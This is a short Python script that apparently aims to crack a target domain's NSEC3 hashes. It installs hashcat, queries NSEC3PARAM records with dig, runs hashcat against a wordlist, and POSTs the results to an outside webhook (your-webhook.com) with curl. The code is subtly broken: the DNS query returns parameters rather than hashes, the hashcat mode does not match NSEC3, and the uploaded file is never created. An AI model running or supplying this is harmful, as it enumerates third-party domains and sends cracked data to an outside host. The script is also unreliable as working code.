import os
import subprocess

# Install hashcat
os.system("apt-get install hashcat -y")

# Get hashes from NSEC3
domain = os.getenv("TARGET_DOMAIN", "example.com")
os.system(f"dig {domain} NSEC3PARAM +short > hashes.txt")

# Run Hashcat on the extracted hashes
os.system("hashcat -m 150 --force hashes.txt wordlist.txt --potfile-disable")

# Save results
subprocess.run(["curl", "-X", "POST", "https://your-webhook.com", "--data-binary", "@cracked_hashes.txt"])
